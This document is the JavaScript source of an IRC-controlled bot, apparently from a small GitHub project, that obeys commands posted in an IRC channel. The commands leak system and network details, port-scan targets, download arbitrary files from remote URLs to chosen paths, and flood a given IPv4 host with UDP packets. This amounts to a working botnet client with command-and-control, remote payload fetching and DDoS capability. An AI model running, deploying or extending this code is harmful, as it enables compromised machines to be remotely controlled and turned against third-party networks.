var irc = require('irc');
var util = require('util');
var os = require('os');
var dns = require('dns');

var iputils = require('ip');
var randomstring = require('randomstring');
var portscanner = require('portscanner');
var wget = require('wget-improved');

var netUtils = require('./lib/net-utils');
var formatUtils = require('./lib/format-utils');
var config = require('./config');

var VERSION = '0.0.2'

var listenMode = false
var nickName = config.nickname || 'nbot_' + randomstring.generate(4);

var cmdSetlistenRe = /^\:set listen$/;
var cmdSetnolistenRe = /^\:set nolisten$/;
var cmdHelloRe = /^\!hello$/;
var cmdSysinfoRe = /^\!sysinfo$/;
var cmdNetinfoRe = /^\!netinfo$/;
var cmdScanRe = /^\!scan (.*?) (.*?)$/;
var cmdDownloadRe = /^\!download (.*?) (.*?) (.*?)$/;
var cmdAboutRe = /^\!about$/;
var cmdDnsRe = /^\!dns (.*?)$/;
var cmdUdpRe = /^\!udp (.*?) (.*?) (.*?)$/;

var bot = new irc.Client('irc.freenode.net', nickName, {
  debug: true,
  channels: config.channels
});

bot.addListener('error', function(message) {
  console.error('[x] ERROR: %s: %s', message.command, message.args.join(' '));
});

bot.addListener('message#hsnl.bots', function(from, message) {
  console.log(from + ' => #hsnl.bots: ' + message);
  var isValidCmdSetlisten = cmdSetlistenRe.test(message);
  var isValidCmdSetnolisten = cmdSetnolistenRe.test(message);

  if (isValidCmdSetlisten) {
    listenMode = true;
    bot.say('#hsnl.bots', '<Bot in listen mode>');
  } else if (isValidCmdSetnolisten) {
    listenMode = false;
    bot.say('#hsnl.bots', '<Bot quit listen mode>');
  }

  var isValidCmdHello = cmdHelloRe.test(message) && listenMode;
  var isValidCmdSysinfo = cmdSysinfoRe.test(message) && listenMode;
  var isValidCmdNetinfo = cmdNetinfoRe.test(message) && listenMode;
  var isValidCmdScan = cmdScanRe.test(message) && listenMode;
  var isValidCmdDownload = cmdDownloadRe.test(message) && listenMode;
  var isValidCmdAbout = cmdAboutRe.test(message) && listenMode;
  var isValidCmdDns = cmdDnsRe.test(message) && listenMode;
  var isValidCmdUdp = cmdUdpRe.test(message) && listenMode;

  if (isValidCmdHello) {
    bot.say('#hsnl.bots', 'Hello there ' + from);

  } else if (isValidCmdSysinfo) {
    var totalMem = os.totalmem() / (2 << 19);
    var freeMem =  os.freemem() / (2 << 19);
    var upTime =  formatUtils.secondsToString(os.uptime());
    var cpuInfo = os.cpus()[0].model;
    var osTypeArch = os.type() + ' ' + os.arch();

    var sysInfo = util.format('cpu: %s; ram: %sMB total, %sMB free; os: %s; uptime: %s.',
                              cpuInfo, totalMem, freeMem, osTypeArch, upTime);

    bot.say('#hsnl.bots', sysInfo);

  } else if (isValidCmdNetinfo) {
    var upNetworkInterfaces = Object.keys(os.networkInterfaces()).toString();

    bot.say('#hsnl.bots', 'IP address: ' + iputils.address());

  } else if (isValidCmdScan) {
    var matchedCmdScan = message.match(cmdScanRe);

    // var matched = cmdScanRe.exec(message);

    var port = matchedCmdScan[2];
    var ip =  matchedCmdScan[1];

    portscanner.checkPortStatus(port, ip, function(error, status) {
      if (error) {
        bot.say('#hsnl.bots', 'Invalid parameters.');
        return
      }

      bot.say('#hsnl.bots',
        ip + ':' + port + ' Port status: ' + status
      );
    });

  } else if (isValidCmdDownload) {
    // var matched = cmdDownloadRe.exec(message);

    var matchedCmdDownload = message.match(cmdDownloadRe);

    console.log(matchedCmdDownload);

    var action = matchedCmdDownload[3];
    var output =  matchedCmdDownload[2] ;
    var url = matchedCmdDownload[1];

    var download = wget.download(url, output);

    download.on('error', function(err) {
      console.log(err);
      bot.say('#hsnl.bots', err);
      return
    });

    download.on('end', function(output) {
      console.log(output);
      bot.say('#hsnl.bots', 'Save to ' + output);
    });
  } else if (isValidCmdAbout) {
    bot.say('#hsnl.bots',
      'nbot version ' + VERSION + ' by [John-Lin] (linton.tw@gmail.com). ' + 'repository: https://github.com/John-Lin/Node-Bot'
    );
  } else if (isValidCmdDns) {
    // var matched = cmdDnsRe.exec(message);
    var matchedCmdDns = message.match(cmdDnsRe);

    var host = matchedCmdDns[1];
    dns.lookup(host, function(err, ip, fam) {
      if (err) {
        bot.say('#hsnl.bots', 'Error message: ' + err);
        return
      }

      bot.say('#hsnl.bots', ip);
    });
  } else if (isValidCmdUdp) {
    var matchedCmdUdp = message.match(cmdUdpRe);

    // var matched = cmdUdpRe.exec(message);

    var pktSize = parseInt(matchedCmdUdp[3], 10);
    var pktNum =  parseInt(matchedCmdUdp[2], 10);
    var host = matchedCmdUdp[1];
    var isInvalidParam = isNaN(pktSize) || isNaN(pktNum) || !netUtils.isIPv4(host);

    if (isInvalidParam) {
      bot.say('#hsnl.bots', 'Invalid parameters.');
      return
    }

    netUtils.sendUDP(host, pktNum, pktSize);

    bot.say('#hsnl.bots',
      'Sending ' + pktNum + ' udp packets to: ' + host + '. packet size: ' + pktSize + 'byte.'
    );
  }

});
